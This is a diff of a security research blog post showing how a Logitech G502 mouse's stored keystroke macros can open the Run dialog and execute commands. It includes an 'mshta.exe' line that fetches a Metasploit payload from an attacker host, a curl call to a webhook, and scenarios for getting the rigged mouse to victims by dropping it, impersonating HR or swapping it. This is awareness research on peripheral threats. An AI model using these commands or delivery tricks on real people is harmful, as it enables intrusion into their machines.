@@ -4,16 +4,16 @@ layout: post
 permalink: /weaponizing-a-logitech-mouse
 ---
 
-<img align="right" src="/assets/mousehack/images/intro.png">
+<img class="img-right" align="right" style="padding-left: 20px" src="/assets/mousehack/images/intro.png"/>
 
 # Introduction
 This is a demonstrative research on how one of the most essential, daily used devices - the computer mouse, can be weaponized into a delivery method for exploits to unsuspecting victims.
 
-In times when (most) people are going crazy about electronic devices and technology, the market for more advanced computer peripherals is also growing. Whether it's tailored for gamers or businesses, nowadays almost every new mouse (or other device) model has an ergonomic shape, RGB lights, numerous programmable buttons and most importantly - memory.
+In times when (most) people are going crazy about electronic devices and technology, the market for more advanced computer peripherals is also growing. Whether it is tailored for gamers or businesses, nowadays almost every new mouse or other device model has an ergonomic shape, RGB lights, numerous programmable buttons and most importantly - memory.
 
 As security professionals, we are constantly raising the awareness on the dangers of technology and the internet to our colleagues, friends and family, (hopefully) stopping them from plugging in a USB drive they found on the street into their computers.
 
-At the same time, we are not putting nearly enough (or any) scrutiny when it comes to the computer mouse. It's not only one of the oldest (and most convenient) ways of interacting with the computer, especially for the normal non-technical user, it is almost intrinsically trusted.
+At the same time, we are not putting nearly enough (or any) scrutiny when it comes to the computer mouse. It is not only one of the oldest and most convenient ways of interacting with the computer, especially for the normal non-technical user, it is almost intrinsically trusted.
 
 Nowadays it comes with shiny lights and many many buttons, further sparking the natural human curiosity of "what does this button do?" that we all share. Read on to see what the buttons can do and how this could be easily exploited.
 
@@ -25,20 +25,21 @@ _"No, USBs are blocked, we provide only a mouse, keyboard and headset to employe
 
 As the good security practices dictate - USB ports were monitored and drives were blocked to prevent employees copying company data or infecting their machines. This topic was so regularly explained/taught by the security team and likewise tested by new employees trying to upload/download files, it was commonly understood that "USBs" meant drives in this context. 
 
-Although I've heard this sentence a thousand times, hearing it again sparked an interesting thought - USB ports are technically not blocked/disabled, the same peripherals that IT provide are still using USB cables/dongles to connect to the laptops. How come they are "trusted"?
+Although I had heard this sentence a thousand times, hearing it again sparked an interesting thought - USB ports are technically not blocked or disabled, the same peripherals that IT provide are still using USB cables or dongles to connect to the laptops. How come they are "trusted"?
 
 Back at home, I recalled that in the past couple of years, several famous E-sports players were caught cheating via... mouse macros. Mice macros are sequences of actions (commands, key or mouse presses and movements) that can help you automate tedious tasks which you can assign to a button on the mouse. For instance you can assign your email address to a button, so instead of typing it often you can just click a button and it is typed for you.
 
 When attending e-sports competitions, teams/players get the same computers and monitors to avoid any performance differences, however, they bring their own peripherals because they are used to them, same as a tennis player having their own custom racket. Unfortunately, some of the e-sports stars brought along macros that gave them an unfair advantage over other players - subtly pointing them in the direction of an enemy player (even through walls), reducing the recoil on their guns or helping them aim directly on target.
 
-If cheaters could achieve keeping their cross-hairs on their enemies in a fast paced game, then surely these macros are powerful enough to be used for other purposes. This gave an answer to my question - no, peripheral devices should not be trusted and are just as suspicious as any other device.
+If cheaters could achieve keeping their cross-hairs on their enemies in a fast paced game, then surely these macros are powerful enough to be used for other purposes. This gave an answer to my question - no, ALL peripheral devices should not be trusted and are equally suspicious.
 
 # Setup
 
 Nowhere near e-sport events, I am a happy owner of one of the most popular family of gaming mice, the Logitech G502. It has an on-board memory that can store up to 5 profiles - with sensitivity, button assignments, lightning settings and most importantly macros. This provides the convenience that once you setup your mouse the way you like it, you can connect it to any computer and all of your settings will remain the same, since they are stored on the mouse itself. 
-Throughout this research will would be focusing on this particular Logitech model, but there are numerous other companies providing a variety of models full of features with prices ranging from just $10 - $15 up to a few hundred.
 
-In the Logitech mice world there are multiple ways to create macros as you will see below, however only one type can be saved on the on-board memory - recorded keystrokes, at least for now. In recent versions Logitech even brought back Lua scripting macros which weren't available for a while. Unfortunately they require a Lua virtual machine which runs as part of the Logitech mouse driver/G HUB Software. With that in mind we will be focusing on recorded keystrokes throughout the rest of this article.
+Throughout this research we will be focusing on this particular Logitech model, but there are numerous other companies providing a variety of models full of features with prices ranging from just $10 - $15 up to a few hundred.
+
+In the Logitech mice world there are multiple ways to create macros as you will see below, however only one type can be saved on the on-board memory - recorded keystrokes, at least for now. In recent versions Logitech even brought back Lua scripting macros which were not available for a while. Unfortunately they require a Lua virtual machine which runs as part of the Logitech mouse driver/G HUB Software. With that in mind we will be focusing on recorded keystrokes throughout the rest of this article.
 
 Managing all of the features and settings of a Logitech mouse is done via the Logitech G HUB software (Available on Windows and Mac only). After installing, starting the program and connecting a Logitech mouse we are greeted by the following screen:
 
@@ -46,7 +47,7 @@ Managing all of the features and settings of a Logitech mouse is done via the Lo
 
 ## Creating a macro
 
-Skipping most of the options, we will jump straight to the interesting part - the macros, profiles and memory. To access the Profiles menu we navigate to the "Manage profiles" menu.
+Skipping most of the options, we will jump straight to the interesting part - the macros, profiles and memory. To access the Profiles we navigate to the "Manage profiles" menu.
 
 ![](/assets/mousehack/images/lghub_manage_profiles.png)
 
@@ -54,15 +55,16 @@ In order to create a macro, from the "Manage profiles" menu we go to "Macros" an
 
 ![](/assets/mousehack/images/lghub_macros.png)
 
+We give the macro a name:
+
 ![](/assets/mousehack/images/lghub_name_this_macro.png)
 
-We give the macro a name.
+We have 4 options for how macros are to be executed, for simplicity we will choose the "No repeat" one to just execute once:
 
 ![](/assets/mousehack/images/lghub_macro_options.png)
 
-We have 4 options for how macros are to be executed, for simplicity we will choose the "No repeat" one to just execute once.
-
 ![](/assets/mousehack/images/lghub_macro_main_screen.png)
+
 Upon clicking the "Start now" button we are provided with the following options on creating the actual macro:
 
 ![](/assets/mousehack/images/lghub_macro_start_now_optilons.png)
@@ -70,9 +72,7 @@ Upon clicking the "Start now" button we are provided with the following options 
 There are several convenient ways for creating macros, but as mentioned only the "Record keystrokes" could be stored in the on-board memory at the time of writing.
 Note: This is ongoing for at least two/three years so there is not much hope of being able to store other macros unless Logitech make some changes in the future. The case could be different in other vendors and models.
 
-Choosing the "Record keystrokes" macro type puts us in recording mode and as soon as we start pressing keys on our keybowrd we see the following symbols popping up:
-
-![](/assets/mousehack/images/lghub_recording_keystrokes.png)
+Choosing the "Record keystrokes" macro type puts us in recording mode and as soon as we start pressing keys on our keyboard we see our keystrokes popping up:
 
 ![](/assets/mousehack/images/lghub_recording_keystrokes.png)
 
@@ -92,7 +92,7 @@ We can now open a text editor and click the assigned button to see our macro in 
 
 _Note: If Logitech enable the Lua scripted macros to be stored in the on-board memory, we can even achieve a zero-click exploit since there is an option to handle the events of a profile being loaded. Leaving just the default profile and adding a handler, will allow our code to execute whenever the mouse gets connected to a computer._
 
-As you can see the macro works, however it is "typing" rather slow. We can speed up things by going to the macro screen and disabling the "Use standard delays" checkbox. This adds another element to the interface, showing the actual delay between our keystrokes when we were recording them. We can delete the delay between each key down and key up event for each respective keystroke and manually set a delay between each pair to 1 ms to increase the overall "typing" speed.
+As you can see the macro works, however it is "typing" rather slow. We can speed things up by going to the macro screen and disabling the "Use standard delays" checkbox. This adds another element to the interface, showing the actual delay between our keystrokes when we were recording them. We can delete the delay between key down and key up events for each respective keystroke and manually set a delay between each pair to 1 ms to increase the overall "typing" speed:
 
 ![](/assets/mousehack/images/lghub_minimal_delay.png)
 
@@ -110,9 +110,9 @@ _Note: This procedure will be repeated after each new macro or modification._
 
 # Demonstration
 
-The main topic of this research is not AV evasion, endpoint detection or lets mess around with Windows defender. The focus is on showing that we are used to put USB drives and keyboards under suspicion, while leaving out an equally relevant device and attack vector - the mouse.
+The main topic of this research is not AV evasion, endpoint detection or let's mess around with Windows defender. The focus is on showing that we are used to put USB drives and keyboards under suspicion, while leaving out an equally relevant device and attack vector - the mouse.
 
-With that said, the following examples are not focused on special payloads that remain undetected by latest version of AVs, but to show how easy it is to setup an over the shelf device to gain access to a victim's machine with a simple enough user interface. The limits on what can be achieved depend on multiple factors such as the target system, installed software & security controls, but the potential is huge.
+With that said, the following examples are not focused on special payloads that remain undetected by latest version of AVs, but to show how easy it is to setup an off-the-shelf device to gain access to a victim's machine with a simple enough user interface. The limits on what can be achieved depend on multiple factors such as the target system, installed software & security controls, but the potential is huge.
 
 ## Curl demo
 
@@ -128,10 +128,10 @@ Breakdown of the macro:
 Win + R  # Shortcut to open the Run program
 cmd /C   # Invoke command prompt and pass a command to it
 curl https://webhook.site/103ee47d-7ac7-49aa-98ac-e74b4fb2bd02 # The curl call
-Enter    # to execute
+Enter    # Execute
 {%endhighlight%}
 
-Once again we can play around with the delay between keystrokes to speed the macro (note the 25ms between invoking "Run" and curl, this is to give enough time to actually open the Run dialog before typing):
+Once again we can play around with the delay between keystrokes to speed up the macro (note the 25ms between invoking "Run" and "cmd", this is done to give enough time to actually open the Run dialog before typing):
 
 ![](/assets/mousehack/images/curl_macro_optimized.png)
 
@@ -139,9 +139,9 @@ As before, we save the macro, enable on-board memory and replace the default pro
 
 <video src="/assets/mousehack/videos/curl_demo.mp4" type="video/mp4" width="100%" controls></video>
 
-As you can see, with the delay optimization executing the macro is almost instant and the user can (maybe) only notice one or two flashing windows that close immediately. An unsuspecting user could think that the OS is still installing drivers for the mouse.
+As you can see, with the delay optimization, executing the macro is almost instant and the user can (maybe) only notice one or two flashing windows that close immediately. An unsuspecting user could think that the OS is still installing drivers for the mouse.
 
-Modifying the payload for Linux, replacing "Win + R" for "Alt + F2" and we see that on Ubuntu it's almost identical:
+Modifying the payload for Linux, replacing "Win + R" for "Alt + F2" and we see that on Ubuntu it is almost identical:
 
 <video src="/assets/mousehack/videos/curl_demo_ubuntu.mp4" type="video/mp4" width="100%" controls></video>
 
@@ -149,9 +149,7 @@ Modifying the payload for Linux, replacing "Win + R" for "Alt + F2" and we see t
 
 We will use a fairly short payload using a well known exploit in Metasploit. As you will see it gets caught by Windows Defender and is not executed. For demonstration purposes we will disable Windows Defender and repeat the demo.
 
-We are using two machines in a local network - the victim Windows machine and an attacker Kali machine.
-
-We are setting our macro to:
+We are using two machines in a local network - the victim Windows machine and an attacker Kali machine. We set our macro to:
 
 {% highlight cmd %}
 WIN+R mshta.exe http://192.168.56.102:8080/
@@ -163,34 +161,34 @@ Since this is a fairly known attack, Windows Defender which is enabled by defaul
 
 <video src="/assets/mousehack/videos/defender_demo.mp4" type="video/mp4" width="100%" controls></video>
 
-After disabling live protection, we can see the full attack. Notice that in both demos, the user could see only a very brief flashing window before the attacker gets access to their machine.
+After disabling live protection, we can see the full attack. Notice that in both demos, the user could see only a very brief flashing window before the attacker gets access to their machine:
 
 <video src="/assets/mousehack/videos/defender_disabled_demo.mp4" type="video/mp4" width="100%" controls></video>
 
 
 ## Qubes OS
 
-Qubes OS is "a reasonably secure operating system", focusing on security and privacy, used by whistle-blowers, journalists and privacy and security enthusiasts. It is designed (at least for now) to be used on a laptop where you use the built-in keyboard and trackpad which are essentially trusted. 
+Qubes OS is "a reasonably secure operating system", focusing on security and privacy, used by whistle-blowers, journalists, privacy and security enthusiasts. It is designed (at least for now) to be used on a laptop where you use the built-in keyboard and trackpad which are essentially trusted. 
 
-During the installation and initial setup there is an option to "Automatically trust USB mice (discouraged)" that is not enabled. For demo purposes I am running Qubes OS in a virtual machine which could be the reason why leaving this option disabled doesn't seem to stop our malicious mouse from being used as you can see:
+During the installation and initial setup there is an option to "Automatically trust USB mice (discouraged)" that is not enabled. For the demonstration I am running Qubes OS in a virtual machine which could be the reason why leaving this option disabled does not seem to stop our malicious mouse from being used:
 
 <video src="/assets/mousehack/videos/qubes_os_demo.mp4" type="video/mp4" width="100%" controls></video>
-Note: The "r" in "rcurl" comes from the Windows tailored payload starting with Win + R. Since there is no Win button modifier in Qubes, the "r" is treated as a normal character.
+Note: The "r" in "rcurl" comes from the Windows tailored payload starting with Win + R. Since there is no Win button modifier in Qubes, the "r" is treated as a normal character and appended to curl.
 
-Our two payloads are still being loaded from the on-board memory and typed successfully even in the "dom0" which is the administrative part of Qubes. Further testing on bare metal is needed to fully confirm the functionality. 
+Our two payloads are still being loaded from the on-board memory and typed successfully even in the "dom0" which is the administrative part of Qubes. Further testing on bare metal is needed to fully confirm the functionality on Qubes. 
 
-However, the mere fact that you will see some scrutiny/controls and warnings that a USB mouse could be a threat ONLY if you use a specialized security and privacy oriented OS for highly advanced users speaks for itself. Once again, only a small percent of people are viewing one of most used peripheral as an attack vector.
+However, the mere fact that you will see some scrutiny/prevention and warnings that a USB mouse could be a threat ONLY if you use a specialized security and privacy oriented OS for highly advanced users speaks for itself. Once again, only a small percent of people are viewing one of most used peripherals as an attack vector.
 
 # Possible attack scenarios
 
-Now that we've seen macros in action and a glimpse of what could be achieved with them, here are a few "hypothetical" attack scenarios:
+Now that we have seen macros in action and a glimpse of what could be achieved with them, here are a few "hypothetical" attack scenarios:
 
-- Placing a "brand-new" mouse in/around an office - depending on the physical security of a corporation gaining access to a machine could be as easy as pretending to go to an interview, tailgate an employee, act as a delivery man, etc. All you would need is to leave a weaponized mouse with/without it's package and wait for an unsuspecting victim to decide to test it out. Hell, you may even "accidentally drop" it anywhere on/around the premises - in a waiting room, hallway, elevator.
-- Send a branded "company" mouse to a target employee - all you would need is the destination address and to impersonate an HR/company representative. Where I leave, you can fill in the sender details however you like, as long as you pay the delivery - they don't care or ask for ID.
+- Placing a "brand-new" mouse in/around an office - depending on the physical security of a corporation gaining access to a machine could be as easy as pretending to go to an interview, tailgate an employee, act as a delivery man, etc. All you would need is to leave a weaponized mouse with/without its packaging on a desk and wait for an unsuspecting victim to decide to test it out. Hell, you may even "accidentally drop" it anywhere on/around the premises - in a waiting room, hallway, elevator.
+- Send a branded "company" mouse to a target employee - all you would need is the destination address and to impersonate an HR/company representative. Where I live, you can use a delivery service and fill in the sender details however you like, as long as you pay the delivery - the provider does not care or ask for an ID.
 - Replacing a target/colleague's mouse with the same model - nowadays not only gaming mice have RGB, multiple buttons and memory, there are many "business class" models out there. With the increase in popularity of more complex mice, this attack could be as easy as buying the same model as your target and having brief access to swap them.
 
 # Conclusion 
-Given how "trusted" mice are by both humans and technology, and the fact that they now come in sexier packages, we as security professionals should start paying more attention to how we provision each device for our homes and for our employees. We have numerous controls and expensive tools to protect us from RATs (remote access trojan), we have almost nothing against mice. *I will walk myself out.*
+Given how trusted mice are by both humans and technology, and the fact that they now come in sexier packages, we as security professionals should start paying more attention to how we provision each device for our homes and for our employees. We have numerous controls and expensive tools to protect us from RATs (remote access trojan), we have almost nothing against mice. *I will walk myself out.*
 
 # References:
 
